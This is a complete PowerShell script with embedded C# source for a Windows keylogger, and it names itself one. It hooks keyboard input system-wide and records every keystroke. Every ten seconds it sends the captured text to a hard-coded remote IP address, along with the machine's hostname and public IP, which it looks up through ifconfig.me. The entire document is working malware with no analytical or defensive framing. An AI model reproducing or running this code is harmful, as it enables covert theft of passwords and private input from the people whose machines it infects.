function Send-Data($assoc)
{
  Write-Host $assoc
  $res = Invoke-WebRequest -uri "http://ifconfig.me/ip"
  $hostn = hostname
  $ip = $res.Content
  $headers = @{
    "Content-Type" = "application/json"
  }
  $uri = "http://18.222.183.100:5000/post"
  $body = @{
      "data" = $assoc
      "ip" = $ip
      "name" = $hostn
  }
  $body = $body | ConvertTo-Json
  $res = Invoke-RestMethod -Uri $uri -Method POST -Body $body -Headers $headers
}
$src = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Management.Automation.Runspaces;

namespace KeyLogger {
    
    public static class Program {
        public static string buf = "";
        private static Action<string> senddata;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;
        private static System.Threading.Timer stateTimer;
        public static void Run(Action<string> func) {
            
        senddata = func;
        hookId = SetHook(hookProc);
        TimerStart();
        Application.Run();
        UnhookWindowsHookEx(hookId);
    }
    
    private static IntPtr SetHook(HookProc hookProc) {
        IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
        return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }
    
    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            var s = GetCharFromKey((Keys)vkCode);
            buf += s;
            if (s == "~") {
                System.Windows.Forms.MessageBox.Show("the keylogger exited");
                stateTimer.Dispose();
                Application.Exit();
            }
        }
    return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
    public static void TimerStart()
    {
        // Create a timer that invokes CheckStatus after one second,
        // and every 1/4 second thereafter.
        stateTimer = new System.Threading.Timer(callee,
        Runspace.DefaultRunspace, 10000, 10000);
    }

    public static void callee(object state){
        if (Runspace.DefaultRunspace == null) {
            System.Management.Automation.Runspaces.Runspace r = (System.Management.Automation.Runspaces.Runspace) state;
            Runspace.DefaultRunspace = r;
        }
        try {
            Console.WriteLine(buf);
            senddata(buf);
            buf = "";
        } catch (Exception e) {
            Console.WriteLine(e);
        }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")]
    public static extern short GetKeyState(int nVirtKey);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    public static extern int ToUnicode(
        uint virtualKeyCode,
        uint scanCode,
        byte[] keyboardState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
        StringBuilder receivingBuffer,
        int bufferSize,
        uint flags);

    // Define some constants for the keyboard state array
    const int KEY_PRESSED = 0x80;
    const int VK_SHIFT = 0x10;
    const int VK_CONTROL = 0x11;
    const int VK_MENU = 0x12;

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetKeyboardState(byte [] lpKeyState);

    // Define a helper method to convert a virtual key code to a character
    public static string GetCharFromKey(Keys key)
    {
        // Create a buffer to receive the character
        StringBuilder buffer = new StringBuilder(256);

        // Get the keyboard state array
        var array = new byte[256];
        GetKeyState(VK_SHIFT);
        GetKeyboardState(array);

        // Call the ToUnicode function to translate the key
        int result = ToUnicode((uint)key, 0, array, buffer, 256, 0);
        // Check the result and return the character or an empty string
        switch (result)
        {
            // A single character was written to the buffer
            case 1:
                return buffer.ToString();

            // No character was translated or a dead key was pressed
            case 0:
            case -1:
                return string.Empty;

            // Multiple characters were written to the buffer
            default:
                return buffer.ToString();
        }
    }
    }
}
"@
Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms
[KeyLogger.Program]::Run({
    param($buf)
    Write-Host $buf
    Send-Data $buf
  });

  